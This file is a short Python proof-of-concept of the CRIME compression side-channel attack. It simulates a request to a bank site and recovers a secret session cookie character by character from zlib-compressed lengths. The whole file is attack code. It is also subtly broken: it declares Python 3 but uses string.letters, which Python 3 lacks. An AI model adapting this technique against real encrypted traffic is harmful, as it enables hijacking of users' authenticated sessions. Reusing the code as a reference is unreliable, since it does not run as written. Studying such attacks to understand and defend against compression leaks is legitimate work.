#!/usr/bin/python3
import string
import zlib
import sys
import random
  
charset = string.letters + string.digits
  
COOKIE = ''.join(random.choice(charset) for x in range(30))
  
HEADERS = ("POST / HTTP/1.1\r\n"
           "Host: thebankserver.com\r\n"
           "Connection: keep-alive\r\n"
           "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\r\n"
           "Accept: */*\r\n"
           "Referer: https://thebankserver.com/\r\n"
           "Cookie: secret="+COOKIE+"\r\n"
           "Accept-Encoding: gzip,deflate,sdch\r\n"
           "Accept-Language: en-US,en;q=0.8\r\n"
           "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n"
           "\r\n")
BODY =    ("POST / HTTP/1.1\r\n"
           "Host: thebankserver.com\r\n"
           "Connection: keep-alive\r\n"
           "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\r\n"
           "Accept: */*\r\n"
           "Referer: https://thebankserver.com/\r\n"
           "Cookie: secret=")
cookie = ""
  
def compress(data):
  
    c = zlib.compressobj()
    return c.compress(data) + c.flush(zlib.Z_SYNC_FLUSH)
def getposset(perchar,chars):
    posset = []
    baselen = len(compress(HEADERS+perchar))
    for i in chars:
        t = len(compress(HEADERS+ perchar+i))
        if (t<=baselen):
            posset += i
    return posset
def doguess():
    global cookie
    while len(cookie)<30:
        posset = getposset(BODY+cookie,charset)
        trun = 1
        tem_posset = posset
        while 1<len(posset):
            tem_body = BODY[trun:]
            posset = getposset(tem_body+cookie,tem_posset)
            trun = trun +1
        if len(posset)==0:
            return False
        cookie += posset[0]
        print (posset[0])
        return True
  
while BODY.find("\r\n")>=0:
    if not doguess():
        print ("(-)Changebody")
        BODY = BODY[BODY.find("\r\n") + 2:]
print ("(+)orign  cookie"+COOKIE)
print ("(+)Gotten cookie"+cookie)
